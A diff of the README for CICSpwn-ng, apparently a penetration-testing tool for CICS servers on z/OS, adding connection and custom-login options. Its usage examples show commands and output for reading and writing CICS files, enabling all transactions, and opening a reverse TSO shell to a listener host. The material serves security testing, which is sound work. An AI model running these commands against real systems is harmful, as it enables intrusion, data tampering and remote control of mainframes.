@@ -1,8 +1,8 @@
 # CICSpwn-ng
-> This is a Python 3 port of the original [CICSpwn](https://github.com/ayoul3/cicspwn) by [@Ayoul3__](https://github.com/ayoul3), with code cleanup and modernization.
+> This is a Python 3 port of the original [CICSpwn](https://github.com/ayoul3/cicspwn) by [@Ayoul3__](https://github.com/ayoul3), with code cleanup, modernization and new features.
 
 ## Description
-CICSpwn is a tool to pentest CICS Transaction servers on z/OS.
+CICSpwn-ng is a tool to pentest CICS Transaction servers on z/OS.
 
 ## Features    
 * Get general information about CICS and the underlying z/OS  
@@ -14,19 +14,29 @@ CICSpwn is a tool to pentest CICS Transaction servers on z/OS.
 * Enables CECI and CEMT if they are RACF protected
 * Remotely execute code using Spoolopen and TDqueue
 * Checks security settings on z/OS
+
+### New in -ng
+* TLS/SSL support with `--ssl` and `--no-verify` for certificate validation control
+* SOCKS/HTTP proxy support via `--proxy` (avoids proxychains TLS issues)
+* Custom EBCDIC codepage and terminal model selection (`--codepage`, `--model`)
+* Multi-LU support via `--lu` with comma-separated names for LU failover
+* Custom login screen support: `--login-key` to send an AID key (PF1-PF24, Enter, Clear) before login, `--login-error` for custom error string detection
+* Flexible `label:value` authentication with `-U` and `-P` for non-standard login screens (e.g. `-U "User ID:myuser" -P "Password:mypass"`)
+* CESF signoff before session termination to free LU sessions
+
 ## Usage
 ```
 $python3 cicspwn.py -h
 
-       ::::::::   :::::::::::   ::::::::    ::::::::   ::::::::: :::       :::::::    ::: 
-      :+:    :+:      :+:      :+:    :+:  :+:    :+:  :+:    :+::+:       :+::+:+:   :+: 
-      +:+             +:+      +:+         +:+         +:+    +:++:+       +:+:+:+:+  +:+ 
-      +#+             +#+      +#+         +#++:++#++  +#++:++#+ +#+  +:+  +#++#+ +:+ +#+  
-      +#+             +#+      +#+                +#+  +#+       +#+ +#+#+ +#++#+  +#+#+# 
-      #+#    #+#      #+#      #+#    #+#  #+#    #+#  #+#        #+#+# #+#+# #+#   #+#+# 
-       ########   ###########   ########    ########   ###         ###   ###  ###    #### 
-      
-                            The tool for some CICS p0wning !		Author: @Ayoul3__
+       ::::::::   :::::::::::   ::::::::    ::::::::   ::::::::: :::       :::::::    :::     ::::    :::  ::::::::
+      :+:    :+:      :+:      :+:    :+:  :+:    :+:  :+:    :+::+:       :+::+:+:   :+:     :+:+:   :+: :+:    :+:
+      +:+             +:+      +:+         +:+         +:+    +:++:+       +:+:+:+:+  +:+     :+:+:+  +:+ +:+
+      +#+             +#+      +#+         +#++:++#++  +#++:++#+ +#+  +:+  +#++#+ +:+ +#+ +#+ +#+ +:+ +#+ +#+  #++#+
+      +#+             +#+      +#+                +#+  +#+       +#+ +#+#+ +#++#+  +#+#+#     +#+  +#+#+# +#+    +#+
+      #+#    #+#      #+#      #+#    #+#  #+#    #+#  #+#        #+#+# #+#+# #+#   #+#+#     #+#   #+#+# #+#    #+#
+       ########   ###########   ########    ########   ###         ###   ###  ###    ####     ###    ####  ########
+
+                            The tool for some CICS p0wning !	Authors: @Ayoul3__ & @yukon
 
 CicsPwn: a tool to pentest CICS transaction servers on z/OS
 
@@ -43,7 +53,8 @@ options:
   --ssl                 Force SSL/TLS connection even on non-standard ports
   --no-verify           Disable TLS server certificate verification (useful
                         when connecting by IP)
-  --lu LU               Specify an LU name for the TN3270 session
+  --lu LU               LU name(s) for the TN3270 session. Comma-separated to
+                        try multiple (e.g. "LUA1,LUA2,LUA3")
   --proxy PROXY         SOCKS/HTTP proxy for s3270 (e.g.
                         socks5:user:pass@host:port). Avoids proxychains TLS
                         issues
@@ -101,9 +112,19 @@ Transaction options:
                         <file.txt>
 
 Access options:
-  -U, --userid USERID   Specify a userid to use on CICS
+  -U, --userid USERID   Specify userid as label:value (e.g.
+                        "User ID:myuser"). Label is the field name on
+                        screen.
   -P, --password PASSWORD
-                        Specify a password for the userid
+                        Specify password as label:value (e.g.
+                        "Password:mypass"). Label is the field name on screen.
+  --login-error LOGIN_ERRORS
+                        Custom error string to detect failed login (e.g.
+                        "Invalid"). Can be specified multiple times.
+  --login-key LOGIN_KEY
+                        AID key to send on initial screen before login (e.g.
+                        "pf5", "enter", "clear"). Use when the CICS welcome
+                        screen requires a key press to reach the login screen.
   -r PROPAGATE_USER     Given the region user ID, checks wether you are
                         allowed to use it to submit JOBs
   -g SURROGAT_USER      Checks wether you can impersonate another user when
@@ -132,17 +153,62 @@ x3270, s3270 or wc3270.exe installed on your system
 pip3 install -r requirements.txt
 ```
 
-## Proxy Usage
+## Connection Options
+
+### Proxy
 When connecting through a SOCKS or HTTP proxy, use the built-in `--proxy` option instead of proxychains. The proxychains `LD_PRELOAD` mechanism interferes with s3270's OpenSSL TLS handshake, causing connection failures on TLS-enabled targets.
 ```
-python3 cicspwn.py 192.168.1.209 23 -a CICS -i --proxy socks5:user:pass@proxyhost:1080
+python3 cicspwn.py 10.0.0.1 23 -a CICS -i --proxy socks5:user:pass@proxyhost:1080
 ```
 Supported proxy types follow the s3270 format: `socks4://`, `socks5:`, `http://`, etc.
 
+### TLS
+For TLS-enabled targets (commonly port 992), use `--ssl`. Add `--no-verify` when connecting by IP or when the server certificate is self-signed:
+```
+python3 cicspwn.py 10.0.0.1 992 -a CICS -i --ssl --no-verify
+```
+
+### LU Names
+Some environments require a specific LU name. Use `--lu` with comma-separated names to try multiple:
+```
+python3 cicspwn.py 10.0.0.1 23 -a CICS -i --lu "LU01,LU02,LU03"
+```
+
+### Codepage and Terminal Model
+For non-US EBCDIC hosts, specify the codepage (e.g. `german-euro` for CP1141). The terminal model controls screen dimensions:
+```
+python3 cicspwn.py 10.0.0.1 23 -a CICS -i --codepage german-euro --model 4
+```
+
+## Authentication
+
+### Custom Login Screens
+Many CICS environments use custom login screens with non-standard field labels. Use `label:value` format with `-U` and `-P` to match the field labels on screen:
+```
+python3 cicspwn.py 10.0.0.1 23 -a CICS -i -U "User ID:myuser" -P "Password:mypass"
+```
+If field labels are standard (e.g. "Userid" and "Password"), plain values still work:
+```
+python3 cicspwn.py 10.0.0.1 23 -a CICS -i -U myuser -P mypass
+```
+
+### Login Key
+When a CICS welcome screen or VTAM menu requires a key press to reach the login screen, use `--login-key`:
+```
+python3 cicspwn.py 10.0.0.1 23 -a CICS -i -U myuser -P mypass --login-key pf5
+```
+Supported keys: `pf1`-`pf24`, `enter`, `clear`.
+
+### Custom Error Detection
+If the login screen shows errors in a non-English language, use `--login-error` (can be specified multiple times):
+```
+python3 cicspwn.py 10.0.0.1 23 -a CICS -i -U myuser -P mypass --login-error "Invalid" --login-error "Denied"
+```
+
 ## Getting general information
 ```
-root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 -i
-[+] Connecting to target 192.168.1.207:23
+$ python3 cicspwn.py -a CICS 10.0.0.1 23 -i
+[+] Connecting to target 10.0.0.1:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Getting information about CICS server (APPLID: CICS)
 	[*] CICS TS Version: 3.2
@@ -172,8 +238,8 @@ root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 -i
 ```
 ## Read a file
 ```
-root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 --get-file FILEA
-[+] Connecting to target 192.168.1.207:23
+$ python3 cicspwn.py -a CICS 10.0.0.1 23 --get-file FILEA
+[+] Connecting to target 10.0.0.1:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Getting Attributes of file FILEA
 [*] File FILEA is enabled, open, and readable
@@ -185,8 +251,8 @@ Ps: adding --num option fetches only one record
 
 ## Add a record to a file
 ```
-root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 --add-record FILEA --num ' 400018' --data file.txt
-[[+] Connecting to target 192.168.1.201:23
+$ python3 cicspwn.py -a CICS 10.0.0.1 23 --add-record FILEA --num ' 400018' --data file.txt
+[+] Connecting to target 10.0.0.1:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [*] File FILEA is enabled and open
 [*] Record size: 80	keylength:6
@@ -198,8 +264,8 @@ PS: if record number 400018 exists, CICSpwn updates the record automatically so 
 
 ## List TSQueues
 ```
-root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 -e
-[+] Connecting to target 192.168.1.207:23
+$ python3 cicspwn.py -a CICS 10.0.0.1 23 -e
+[+] Connecting to target 10.0.0.1:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Getting all tsqueues that match *
 Tsqueue	Items	Length	Transaction
@@ -212,8 +278,8 @@ TES5	00001	0000000064	CECI
 
 ## Activate ALL transactions
 ```
-root@kali:~/cics# python3 cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 --enable-tran ALL
-[+] Connecting to target 192.168.1.207:23
+$ python3 cicspwn.py 10.0.0.1 23 -a CICS -U myuser -P mypass --enable-tran ALL
+[+] Connecting to target 10.0.0.1:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [*] Successful authentication
 [+] Activating ALL transactions
@@ -223,8 +289,8 @@ root@kali:~/cics# python3 cicspwn.py 192.168.1.207 23 -a CICS -U AYOUB -P AYOU1 
 
 ## Reverse shell using CICSpwn
 ```
-root@kali:~/cics# python3 cicspwn.py -a CICS 192.168.1.209 23 -s reverse_tso -l 192.168.1.16:4445
-[+] Connecting to target 192.168.1.209:23
+$ python3 cicspwn.py -a CICS 10.0.0.1 23 -s reverse_tso -l 10.0.0.2:4445
+[+] Connecting to target 10.0.0.1:23
 [*] Access to CICS Terminal is possible with APPID CICS
 [+] Setting the current terminal to mixed case
 [*] Got TerminalID L702
